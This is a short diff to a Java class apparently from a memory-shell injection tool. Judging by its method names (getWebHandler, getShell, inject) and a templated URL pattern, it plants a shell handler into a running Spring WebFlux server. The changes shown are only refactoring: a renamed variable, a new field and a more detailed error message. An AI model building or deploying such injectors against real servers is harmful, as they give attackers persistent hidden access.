@@ -19,6 +19,8 @@ import java.util.zip.GZIPInputStream;
  */
 public class SpringWebFluxHandlerFunctionInjector {
 
+    private String msg = "";
+
     public String getUrlPattern() {
         return "{{urlPattern}}";
     }
@@ -32,10 +34,11 @@ public class SpringWebFluxHandlerFunctionInjector {
     }
 
     public SpringWebFluxHandlerFunctionInjector() {
+        Object webHandler = null;
         try {
-            Object webHandler = getWebHandler();
-            Object functionObj = getShell();
-            inject(webHandler, functionObj);
+            webHandler = getWebHandler();
+            Object shell = getShell();
+            inject(webHandler, shell);
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -152,6 +155,6 @@ public class SpringWebFluxHandlerFunctionInjector {
                 clazz = clazz.getSuperclass();
             }
         }
-        throw new NoSuchFieldException();
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 }
